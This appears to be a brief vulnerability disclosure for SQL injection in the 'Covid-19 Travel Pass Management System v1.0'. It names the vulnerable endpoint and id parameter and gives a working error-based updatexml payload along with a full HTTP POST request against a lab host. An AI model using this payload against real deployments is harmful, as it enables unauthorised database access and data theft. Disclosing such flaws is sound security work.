# Covid-19 Travel Pass Management System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15308/covid-19-travel-pass-management-system-phpoop-free-source-code.html

Vulnerability File: /ctpms/classes/Master.php?f=delete_application

Vulnerability location: /ctpms/classes/Master.php?f=delete_application, id

[+] Payload: id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
POST /ctpms/classes/Master.php?f=delete_application HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/ctpms/admin/?page=applications/view_application&id=1
Content-Length: 65
Cookie: PHPSESSID=sbd29ujtf9eelnf4f6rlt8ikfi
Connection: close

id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id
```

![image](https://user-images.githubusercontent.com/54017627/167080261-533dc081-e05f-47fe-9b1a-f1f30ba13c4c.png)
